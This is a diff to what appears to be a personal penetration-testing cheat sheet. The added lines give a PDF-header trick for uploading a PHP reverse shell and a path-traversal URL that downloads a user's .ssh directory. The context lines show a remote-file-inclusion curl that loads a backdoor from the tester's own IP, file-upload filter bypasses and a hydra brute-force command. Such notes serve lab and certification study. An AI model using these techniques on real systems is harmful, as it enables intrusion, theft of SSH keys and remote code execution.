@@ -190,6 +190,16 @@ curl "http://example.com/subdir/index.php?page=http://$YOUR_IP/simple-backdoor.p
 
 18. File Upload Vulns (Executable)
 
+THINK ABOUT RCE WHENEVER YOU HAVE LFI.
+
+THINK ABOUT LOCAL FILE INCLUSION.
+
+For PDF bypass, try to add the "%PHP 1.7\n%" thing at the top and change the name to reverse.pdf.php.
+
+```bash
+http://192.168.180.231/?cwd=../../../../../../../../home/remi&file=.ssh&download=true
+```
+
 - Wherever you can upload files, see what files you are allowed to upload. If .php files are blacklisted, then you can try to use .pHP, .phps, .php7, pht, phpt, phtml, php3, php4, php5, php6 instead. If .sh files are blacklisted, then you can try to use .zsh instead.
 
 - Whitelisting may be able to be bypassed through methods such as adding a null byte injection, "payload.php\x00.png", "shell.php%00.txt", "echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png", or by using double extensions for the file, "shell.txt.php"
@@ -350,3 +360,8 @@ Note that it sends the payload non-url-encoded.
 hydra -l user -P pwdpath ip http-get
 # -I to override previous scan with updated list
 ```
+
+
+
+
+
